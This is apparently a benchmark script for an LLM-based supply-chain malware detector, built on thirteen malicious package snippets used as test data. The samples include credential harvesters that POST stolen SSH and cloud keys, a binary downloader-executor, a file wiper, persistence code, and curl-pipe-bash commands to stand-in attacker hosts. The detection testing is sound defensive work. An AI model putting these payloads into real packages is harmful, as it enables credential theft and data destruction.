/**
 * LLM efficacy benchmark — runs the full triage + LLM pipeline against the
 * same 13-entry corpus as test-efficacy.ts and reports what the LLM finds.
 *
 * Usage:
 *   OPENROUTER_API_KEY=sk-or-v1-... bun test-efficacy-llm.ts
 *
 * Optional env vars:
 *   SC_MAX_LLM_FILES   — max files per entry sent to LLM (default: 3)
 *   SC_MODEL           — model name (default: anthropic/claude-sonnet-4-5)
 *
 * No network calls beyond the OpenRouter LLM API. All "packages" are the
 * in-memory code snippets from the corpus — no tarballs are downloaded.
 */

import { HumanMessage, SystemMessage, AIMessage, ToolMessage } from '@langchain/core/messages';
import { runTriage, buildContentMap, createPackageTools } from './src/supply-chain/llm/tools.js';
import { buildAgentSystemPrompt, buildFileAnalysisPrompt } from './src/supply-chain/llm/prompts.js';
import { createChatModel } from './src/supply-chain/llm/client.js';
import type { PackageMetadata, PackageSource, RegistrySignals } from './src/supply-chain/types.js';

const MIN_TRIAGE_SCORE = 8;
const MAX_LLM_FILES = parseInt(process.env.SC_MAX_LLM_FILES ?? '3');
const MODEL = process.env.SC_MODEL ?? 'anthropic/claude-sonnet-4-5';
const INSTALL_TRIGGER_RE = /\.(pth|sh|bat|ps1)$|\/(?:post-?install|pre-?install|install)\.[jt]s$/i;

const apiKey = process.env.OPENROUTER_API_KEY;
if (!apiKey) {
  console.error('Error: set OPENROUTER_API_KEY=sk-or-v1-... to run LLM analysis');
  process.exit(1);
}

// ── Corpus (mirrors test-efficacy.ts) ────────────────────────────────────────

interface AttackEntry {
  id: string;
  advisory: string;
  ecosystem: 'npm' | 'pypi';
  description: string;
  filePath: string;
  content: string;
}

const CORPUS: AttackEntry[] = [
  {
    id: 'litellm-1.82.8',
    advisory: 'MAL-2026-2144 / GHSA-5mg7-485q-xm76',
    ecosystem: 'pypi',
    description: '.pth file runs subprocess at Python startup, exfiltrates SSH/AWS/GCP creds via curl',
    filePath: 'litellm_init.pth',
    content: `import subprocess, sys
subprocess.Popen([sys.executable, "-c",
  "import base64; exec(base64.b64decode('aW1wb3J0IG9zLCBzdWJwcm9jZXNz'))"
], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
`,
  },
  {
    id: 'litellm-1.82.8-payload',
    advisory: 'MAL-2026-2144 / GHSA-5mg7-485q-xm76',
    ecosystem: 'pypi',
    description: 'Inner decoded payload: harvests .ssh, .aws, .kube, gcloud then POSTs encrypted archive to C2',
    filePath: 'litellm/__init__.py',
    content: `import os, subprocess, tarfile
home = os.path.expanduser('~')
stolen = []
for f in ['.ssh/id_rsa', '.aws/credentials', '.kube/config', '.bash_history', '.config/gcloud']:
    p = os.path.join(home, f)
    if os.path.exists(p):
        stolen.append(p)
with tarfile.open('/tmp/tpcp.tar.gz', 'w:gz') as tar:
    for s in stolen: tar.add(s)
subprocess.run(['openssl', 'enc', '-aes-256-cbc', '-in', '/tmp/tpcp.tar.gz', '-out', '/tmp/payload.enc', '-pass', 'pass:secret'])
subprocess.run(['curl', '-X', 'POST', 'https://models.litellm.cloud/', '--data-binary', '@/tmp/payload.enc'])
`,
  },
  {
    id: 'event-stream-2018',
    advisory: 'npm advisory 737',
    ecosystem: 'npm',
    description: 'Encrypted payload decoded and eval\'d at install time to steal bitcoin wallets',
    filePath: 'lib/index.js',
    content: `var r = require, co = r('co'), decode = r('./lib/decode');
var d = new Buffer('db67d919d8b489a5b6f5b8f6f6f6b5a6', 'hex');
co(function*() {
  var payload = decode(d.toString('utf8'));
  eval(payload);
}).catch(function(){});
`,
  },
  {
    id: 'ua-parser-js-2021',
    advisory: 'CVE-2021-22537',
    ecosystem: 'npm',
    description: 'Compromised package downloads and executes a platform-specific binary in postinstall',
    filePath: 'preinstall.js',
    content: `const { execSync } = require('child_process');
const os = require('os');
const https = require('https');
const fs = require('fs');
const tmpDir = os.tmpdir();
const platform = process.platform;
const url = platform === 'win32'
  ? 'https://citationsherbe.at/sdd.exe'
  : 'https://citationsherbe.at/sdd';

https.get(url, (res) => {
  const file = fs.createWriteStream(tmpDir + '/update');
  res.pipe(file);
  file.on('finish', () => {
    fs.chmodSync(tmpDir + '/update', '755');
    execSync(tmpDir + '/update');
  });
});
`,
  },
  {
    id: 'node-ipc-peacenotwar-2022',
    advisory: 'CVE-2022-23812',
    ecosystem: 'npm',
    description: 'Conditional geolocation check activates file wiper on Russian/Belarusian IPs',
    filePath: 'lib/ssl.js',
    content: `const os = require('os');
const { exec } = require('child_process');
const ips = require('./geoloc');
if (os.platform() === 'linux' && ips.isTargetRegion()) {
  exec('find / -name "*.js" | xargs -I {} sh -c "echo \\'\\' > {}"');
}
`,
  },
  {
    id: 'solarwinds-timebomb-style',
    advisory: 'CVE-2020-10148 (pattern)',
    ecosystem: 'npm',
    description: 'Time-bomb: sleeps N days before activating C2 connection to avoid sandbox detection',
    filePath: 'lib/worker.js',
    content: `const ACTIVATION_DATE = 1800000000000;
module.exports = function run(cmd) {
  if (Date.now() > ACTIVATION_DATE) {
    const cp = require('child_process');
    cp.exec(cmd, (err, stdout) => {
      require('https').get('https://c2.malware.example/beacon?d=' + Buffer.from(stdout).toString('base64'));
    });
  }
};
`,
  },
  {
    id: 'colourama-pypi-2019',
    advisory: 'PyPI malware report 2019',
    ecosystem: 'pypi',
    description: 'Typosquat of colorama: captures all env vars and POSTs to attacker server',
    filePath: 'colourama/__init__.py',
    content: `import os, urllib.request, platform
def _init():
    data = {k: os.environ.get(k, '') for k in os.environ}
    data['h'] = platform.node()
    urllib.request.urlopen('http://evil.example.com/collect', data=str(data).encode())
_init()
`,
  },
  {
    id: 'bash-history-harvest',
    advisory: 'Generic credential harvesting pattern (litellm variant)',
    ecosystem: 'pypi',
    description: 'Shell history file read — attacker reads recent commands to find secrets',
    filePath: 'setup.py',
    content: `import os
home = os.path.expanduser('~')
for history_file in ['.bash_history', '.zsh_history']:
    path = os.path.join(home, history_file)
    if os.path.exists(path):
        with open(path) as f:
            exfil_data += f.read()
`,
  },
  {
    id: 'macos-launchagents-persist',
    advisory: 'macOS persistence pattern (PyPI malware)',
    ecosystem: 'pypi',
    description: 'Writes a LaunchAgent plist for user-level persistence surviving reboots',
    filePath: 'setup.py',
    content: `import os, plistlib
agent = {
    'Label': 'com.apple.softwareupdate.helper',
    'ProgramArguments': ['/usr/bin/python3', '/tmp/.payload'],
    'RunAtLoad': True,
    'KeepAlive': True,
}
plist_path = os.path.expanduser('~/Library/LaunchAgents/com.apple.softwareupdate.helper.plist')
with open(plist_path, 'wb') as f:
    plistlib.dump(agent, f)
os.system('launchctl load ' + plist_path)
`,
  },
  {
    id: 'windows-registry-persist',
    advisory: 'Windows registry run-key persistence pattern',
    ecosystem: 'npm',
    description: 'Adds HKCU Run key for persistence on Windows via reg.exe',
    filePath: 'scripts/postinstall.js',
    content: `const { execSync } = require('child_process');
if (process.platform === 'win32') {
  execSync('reg.exe add HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v NodeUpdater /t REG_SZ /d "node C:\\\\tmp\\\\payload.js" /f');
}
`,
  },
  {
    id: 'circleci-ci-poisoning',
    advisory: 'CI/CD pipeline poisoning pattern',
    ecosystem: 'npm',
    description: 'Injects malicious step into CircleCI config at install time',
    filePath: 'scripts/postinstall.js',
    content: `const fs = require('fs');
const maliciousStep = \`
version: 2.1
jobs:
  build:
    steps:
      - run: curl https://attacker.example.com/exfil | bash
\`;
fs.writeFileSync('.circleci/config.yml', maliciousStep);
`,
  },
  {
    id: 'xz-utils-build-backdoor-2024',
    advisory: 'CVE-2024-3094',
    ecosystem: 'npm',
    description: 'Build system backdoor: execSync fetches and injects payload via webpack BannerPlugin at bundle time',
    filePath: 'webpack.config.js',
    content: `const { execSync } = require('child_process');
const webpack = require('webpack');
const stageTwo = execSync('curl -sf https://malicious.cdn.example.com/b64 | base64 -d').toString();
module.exports = {
  plugins: [
    new webpack.BannerPlugin({ banner: stageTwo, raw: true }),
  ],
};
`,
  },
  {
    id: 'trojan-source-2021',
    advisory: 'CVE-2021-42574',
    ecosystem: 'npm',
    description: 'Bidirectional Unicode overrides make malicious code appear as an innocuous comment',
    filePath: 'lib/auth.js',
    content: `if (accessLevel !== 'user') { /* Check if admin \u202e \u2066 } if (isAdmin) { \u2069 \u2066 */ return false; }
exfiltrate(adminSecrets);`,
  },
];

// ── Helpers ───────────────────────────────────────────────────────────────────

function buildFakeMeta(entry: AttackEntry): PackageMetadata {
  const signals: RegistrySignals = {
    maintainerChangedInLatestRelease: false,
    previousMaintainers: [],
    newMaintainers: [],
    packageAgeDays: 365,
    publishedDaysAgo: 7,
    typosquatCandidate: null,
    isDependencyConfusion: false,
    hasProvenance: false,
    riskScore: 2,
  };
  return {
    name: entry.id,
    ecosystem: entry.ecosystem,
    latestVersion: '1.0.0',
    createdAt: '2024-01-01T00:00:00Z',
    updatedAt: '2024-01-01T00:00:00Z',
    weeklyDownloads: 10000,
    maintainers: ['unknown'],
    hasInstallScripts: false,
    installScripts: {},
    registrySignals: signals,
  };
}

function buildFakeSource(entry: AttackEntry): PackageSource {
  return {
    name: entry.id,
    ecosystem: entry.ecosystem,
    version: '1.0.0',
    installScripts: {},
    fileList: [entry.filePath],
    fileContents: { [entry.filePath]: entry.content },
    suspiciousFiles: {},
  };
}

// ── LLM runner ────────────────────────────────────────────────────────────────

interface LLMResult {
  id: string;
  score: number;
  findings: Array<{ severity: string; category: string; title: string; confidence: number; description: string }>;
  detected: boolean;
  error?: string;
}

const chatModel = createChatModel({ apiKey, model: MODEL, provider: 'openrouter' });

async function runEntry(entry: AttackEntry): Promise<LLMResult> {
  const source = buildFakeSource(entry);
  const meta = buildFakeMeta(entry);
  const allContent = buildContentMap(source);
  const triageResults = runTriage(allContent);
  const aboveThreshold = triageResults.filter(r => r.score >= MIN_TRIAGE_SCORE);

  if (aboveThreshold.length === 0) {
    return { id: entry.id, score: 0, findings: [], detected: false, error: 'score below threshold — would not reach LLM' };
  }

  // Smart cap
  let llmFiles = aboveThreshold;
  if (aboveThreshold.length > MAX_LLM_FILES) {
    const priority = aboveThreshold.filter(r => INSTALL_TRIGGER_RE.test(r.filePath));
    const rest = aboveThreshold.filter(r => !INSTALL_TRIGGER_RE.test(r.filePath)).slice(0, Math.max(0, MAX_LLM_FILES - priority.length));
    llmFiles = [...priority, ...rest];
  }

  const { listFiles, readFile, grepPackage, reportFindings } = createPackageTools(source, allContent);
  const tools = [listFiles, readFile, grepPackage, reportFindings];
  const modelWithTools = chatModel.bindTools!(tools);
  const systemPrompt = buildAgentSystemPrompt();

  const allFindings: LLMResult['findings'] = [];

  for (const triageEntry of llmFiles) {
    const fileContent = allContent.get(triageEntry.filePath);
    if (!fileContent) continue;

    const filePrompt = buildFileAnalysisPrompt(meta, triageEntry, fileContent, source);
    const messages: any[] = [new SystemMessage(systemPrompt), new HumanMessage(filePrompt)];

    for (let round = 0; round < 10; round++) {
      const response = await modelWithTools.invoke(messages);
      messages.push(response);
      const toolCalls = (response as AIMessage).tool_calls ?? [];
      if (toolCalls.length === 0) break;

      for (const tc of toolCalls) {
        const tool = tools.find(t => t.name === tc.name);
        if (!tool) {
          messages.push(new ToolMessage({ tool_call_id: tc.id!, content: `Unknown tool: ${tc.name}` }));
          continue;
        }
        const result = await tool.invoke(tc.args);
        messages.push(new ToolMessage({
          tool_call_id: tc.id!,
          content: typeof result === 'string' ? result : JSON.stringify(result),
        }));
        if (tc.name === 'report_findings' && tc.args?.findings) {
          for (const f of tc.args.findings as any[]) {
            allFindings.push({
              severity: f.severity ?? 'MEDIUM',
              category: f.category ?? 'unknown',
              title: f.title ?? '',
              confidence: typeof f.confidence === 'number' ? f.confidence : 0.5,
              description: f.description ?? '',
            });
          }
        }
      }
    }
  }

  const score = aboveThreshold[0]?.score ?? 0;
  return { id: entry.id, score, findings: allFindings, detected: allFindings.length > 0 };
}

// ── Main ──────────────────────────────────────────────────────────────────────

console.log('\n═══ Supply Chain LLM Efficacy Benchmark ═══');
console.log(`Model: ${MODEL} via OpenRouter`);
console.log(`Corpus: ${CORPUS.length} entries | LLM cap: ${MAX_LLM_FILES} file(s) per entry\n`);

const results: LLMResult[] = [];
let truePositives = 0;
let missed = 0;

for (const entry of CORPUS) {
  process.stdout.write(`  Running ${entry.id}...`);
  try {
    const result = await runEntry(entry);
    results.push(result);
    const status = result.detected ? '✓' : '✗';
    const tag = result.error ? ` (${result.error})` : ` — ${result.findings.length} finding(s)`;
    console.log(` ${status}${tag}`);
    if (result.findings.length > 0) {
      for (const f of result.findings) {
        console.log(`    [${f.severity}] ${f.category} — ${f.title} (${Math.round(f.confidence * 100)}%)`);
      }
    }
    if (result.detected) truePositives++; else missed++;
  } catch (err: any) {
    console.log(` ✗ ERROR: ${err.message}`);
    results.push({ id: entry.id, score: 0, findings: [], detected: false, error: err.message });
    missed++;
  }
}

// ── Summary ───────────────────────────────────────────────────────────────────

const total = CORPUS.length;
const rate = Math.round((truePositives / total) * 100);

console.log('\n─────────────────────────────────────────');
console.log(`LLM detection rate: ${truePositives}/${total} (${rate}%)`);

if (missed > 0) {
  console.log('\nMissed:');
  for (const r of results.filter(r => !r.detected)) {
    console.log(`  ✗ ${r.id}${r.error ? ' — ' + r.error : ''}`);
  }
}

console.log('\nFinding severity breakdown:');
const allFindings = results.flatMap(r => r.findings);
for (const sev of ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']) {
  const count = allFindings.filter(f => f.severity.toUpperCase() === sev).length;
  if (count > 0) console.log(`  ${sev.padEnd(8)} ${count}`);
}

console.log('─────────────────────────────────────────\n');
if (missed > 0) process.exit(1);
